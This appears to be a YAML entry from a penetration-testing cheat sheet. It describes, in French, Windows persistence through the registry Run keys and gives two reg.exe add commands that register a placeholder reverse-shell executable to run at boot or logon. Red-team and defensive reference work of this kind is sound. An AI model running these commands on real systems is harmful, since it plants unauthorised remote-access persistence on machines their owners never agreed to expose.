---
description: |
  Il est possible d'obtenir une persistance sur une machine Windows en ajoutant des clés reg qui exécuteront une charge utile arbitraire lors de la connexion ou du démarrage. Les clés ajoutées à la ruche HKLM s'exécuteront au démarrage. Les clés ajoutées à la ruche HKCU s'exécuteront lorsque l'utilisateur correspondant se connectera. L'ajout de clés dans la ruche HKLM nécessite un shell élevé. Quatre clés peuvent être utilisées : Run, RunOnce, RunServices et RunServicesOnce. Par défaut, une clé RunOnce est supprimée après l'exécution de la commande spécifiée. Le chemin d'accès à ces clés est le même pour les ruches HKLM et HKCU.

  Command Reference:

  	Value Name: Persistence

  	RegKey data type: REG_SZ

  	Data: "C:\Path\To\revshell.exe"

  	KeyName: "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"

command: |
   reg.exe add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Persistence /t REG_SZ /d "C:\Path\To\revshell.exe"

   reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Persistence /t REG_SZ /d "C:\Path\To\revshell.exe"

items:
  - Shell
OS:
  - Windows
  - Approved-tool
attack_types:
  - Persistence
references:
  - https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/
  - https://www.hackingarticles.in/windows-persistence-using-winlogon/
  - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg
  - https://docs.microsoft.com/en-us/windows-hardware/drivers/install/runonce-registry-key
---
